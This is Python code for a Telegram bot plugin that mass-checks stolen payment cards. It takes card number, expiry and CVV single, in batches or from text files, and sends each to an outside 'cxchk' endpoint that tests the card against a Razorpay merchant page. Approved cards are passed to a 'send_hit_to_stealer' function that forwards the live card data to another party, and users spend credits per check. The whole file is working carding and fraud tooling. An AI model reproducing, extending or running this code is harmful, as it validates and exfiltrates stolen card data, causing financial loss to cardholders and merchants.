import time
import asyncio
import re
import json
import aiohttp
from pyrogram import filters

# -------------------------------------------------------------
# Configuration for this gateway
# -------------------------------------------------------------
GATE_NAME = "Razorpay 1$"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

API_BASE = "https://pay.cxchk.site/razor/auto"
SITE_PARAM = "https://pages.razorpay.com/lckuk-international"   # change if needed

# -------------------------------------------------------------
# Helper: call Razorpay API (returns only status and message, not raw JSON)
# -------------------------------------------------------------
async def call_razor_api(fullcc: str) -> tuple:
    """
    Returns: (status_display, extracted_response_message)
    status_display: "Approved ✅" or "Declined ❌" or "Error"
    """
    try:
        parts = fullcc.split('|')
        if len(parts) != 4:
            return "Error", "Invalid card format"
        cc, mm, yy, cvv = parts
        card_string = f"{cc}|{mm}|{yy}|{cvv}"
        url = f"{API_BASE}?site={SITE_PARAM}&cc={card_string}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status != 200:
                    return "Error", f"HTTP {resp.status}"
                data = await resp.json()
                api_status = data.get("status", "").lower()
                message = data.get("response", "No response")
                if api_status == "approved":
                    display_status = "Approved ✅"
                else:
                    display_status = "Declined ❌"
                return display_status, message
    except Exception as e:
        return "Error", str(e)[:50]

def extract_cards(text: str):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# -------------------------------------------------------------
# Single check command (/rz)
# -------------------------------------------------------------
@Client.on_message(filters.command("rz", [".", "/"]))
async def razor_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /rz cc|mm|yyyy|cvv",
                quote=True, parse_mode="HTML"
            )
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        msg = await message.reply_text(
            f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n"
            f"{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n"
            f"{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>",
            quote=True, parse_mode="HTML"
        )

        start = time.perf_counter()
        status, api_message = await call_razor_api(fullcc)
        elapsed = time.perf_counter() - start

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Approved" in status:
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)

        final_text = f"""<b>{status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await msg.edit_text(final_text, disable_web_page_preview=True, parse_mode="HTML")
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# Mass check command (/mrz)
# -------------------------------------------------------------
@Client.on_message(filters.command("mrz", [".", "/"]))
async def razor_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mrz cc|mm|yyyy|cvv (max {MAX_MSC_LIMIT})",
                quote=True, parse_mode="HTML"
            )
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT file command (/trz)
# -------------------------------------------------------------
@Client.on_message(filters.command("trz", [".", "/"]))
async def razor_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message

        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode="HTML"
            )
            return

        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# Sequential processing (shared by /mrz and /trz)
# -------------------------------------------------------------
async def process_sequential_check(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved_count = 0
    declined_count = 0
    start_time = time.perf_counter()
    approved_cards = []

    progress_msg = await message.reply(
        f"Razorpay API Checker\n\n"
        f"{SYMBOL} Progress: 0/{total}\n"
        f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
        f"Checked by: {first_name} ({role})",
        quote=True, parse_mode="HTML"
    )

    for idx, fullcc in enumerate(ccs, 1):
        status, api_message = await call_razor_api(fullcc)

        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
        flag = bin_data[5] if len(bin_data) > 5 else ""

        if "Approved" in status:
            approved_count += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": api_message,
                "brand": f"{brand}_{type_}-{level}", "bank": bank,
                "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined_count += 1

        remaining = total - idx
        await progress_msg.edit_text(
            f"Razorpay API Checker\n\n"
            f"{SYMBOL} Progress: {idx}/{total}\n"
            f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
            f"Checked by: {first_name} ({role})",
            parse_mode="HTML"
        )
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    # Send each approved card as a separate message
    for card in approved_cards:
        approved_msg = f"""<b>{card['status']}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode="HTML")
        await asyncio.sleep(0.5)

    elapsed = round(time.perf_counter() - start_time, 2)

    # Declined summary
    if approved_count > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            decl_text += f"\n... and {declined_count - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode="HTML")
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
            f"👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode="HTML"
        )

    await setantispamtime(user_id)
